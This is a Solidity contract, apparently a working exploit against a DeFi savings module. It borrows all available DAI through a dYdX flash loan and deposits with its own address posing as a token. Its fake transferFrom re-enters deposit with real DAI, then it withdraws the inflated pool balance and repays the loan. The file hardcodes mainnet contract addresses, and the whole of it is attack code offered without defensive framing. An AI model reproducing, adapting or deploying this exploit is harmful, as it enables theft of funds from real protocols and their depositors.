// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./dydx/contracts/DydxFlashloanBase.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISavingsModule {
    function poolTokenByProtocol(address _protocol) external view returns(address);

    function deposit(
        address _protocol, 
        address[] memory _tokens, 
        uint256[] memory _dnAmounts
    ) external returns(uint256);

    function withdraw(
        address _protocol, 
        address token, 
        uint256 dnAmount, 
        uint256 maxNAmount
    ) external returns(uint256);
}

interface ICrvLP {
    function get_virtual_price() external view returns(uint256);
}

contract Luck is DydxFlashloanBase {

    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant CRV_LP = 0xC25a3A3b969415c80451098fa907EC722572917F;

    address private constant CRV_SUSD_POOL = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    address private constant SOLO_MARGIN = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;

    address private constant SAVINGS_MODULES_PROXY = 0x73fC3038B4cD8FfD07482b92a52Ea806505e5748;

    address private constant PROTOCOLS = 0x91d7b9a8d2314110D4018C88dBFDCF5E2ba4772E;


    function luck() external {
        uint256 _borrowLimit = IERC20(DAI).balanceOf(SOLO_MARGIN);

        ISoloMargin solo = ISoloMargin(SOLO_MARGIN);

        // Get marketId from token address
        uint256 marketId = _getMarketIdFromTokenAddress(SOLO_MARGIN, DAI);

        // Calculate repay amount (_amount + (2 wei))
        // Approve transfer from
        uint256 repayAmount = _getRepaymentAmountInternal(_borrowLimit);
        IERC20(DAI).approve(SOLO_MARGIN, repayAmount);

        // 1. Withdraw $
        // 2. Call callFunction(...)
        // 3. Deposit back $
        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        operations[0] = _getWithdrawAction(marketId, _borrowLimit);
        operations[1] = _getCallAction(
            // Encode MyCustomData for callFunction
            ""
        );
        operations[2] = _getDepositAction(marketId, repayAmount);

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        solo.operate(accountInfos, operations);

        // revoke all allowance
        IERC20(DAI).approve(SOLO_MARGIN, 0);
        IERC20(DAI).approve(SAVINGS_MODULES_PROXY, 0);
    }

    /**
     * Allows users to send this contract arbitrary data.
     *
     * @param  sender       The msg.sender to Solo
     * @param  accountInfo  The account from which the data is being sent
     * @param  data         Arbitrary data given by the sender
     */
    // This is the function that will be called postLoan
    // i.e. Encode the logic to handle your flashloaned funds here
    function callFunction(
        address sender,
        Account.Info memory accountInfo,
        bytes memory data
    ) external {
        uint256 balOfLoanedToken = IERC20(DAI).balanceOf(address(this));

        IERC20(DAI).approve(SAVINGS_MODULES_PROXY, type(uint256).max);

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(this);
        uint256[] memory _dnAmounts = new uint256[](1);
        _dnAmounts[0] = 5000000;

        ISavingsModule(SAVINGS_MODULES_PROXY).deposit(PROTOCOLS, _tokens, _dnAmounts);

        address _poolToken = ISavingsModule(SAVINGS_MODULES_PROXY).poolTokenByProtocol(PROTOCOLS);

        ISavingsModule(SAVINGS_MODULES_PROXY).withdraw(
            PROTOCOLS, 
            DAI, 
            IERC20(_poolToken).balanceOf(address(this)) * 99 / 100, 
            0
        );
    } 

    function transferFrom(address _sender, address _spender, uint256 _amt) external returns(bool) {
        
        uint256 _daiBal = IERC20(DAI).balanceOf(address(this));

        address[] memory _tokens = new address[](1);
        _tokens[0] = DAI;
        uint256[] memory _dnAmounts = new uint256[](1);
        _dnAmounts[0] = _daiBal * 99 / 100;

        ISavingsModule(SAVINGS_MODULES_PROXY).deposit(PROTOCOLS, _tokens, _dnAmounts);

        // For curve add_liauidity limit?
        IERC20(DAI).transfer(PROTOCOLS, 1e18);

        return true;
    }
}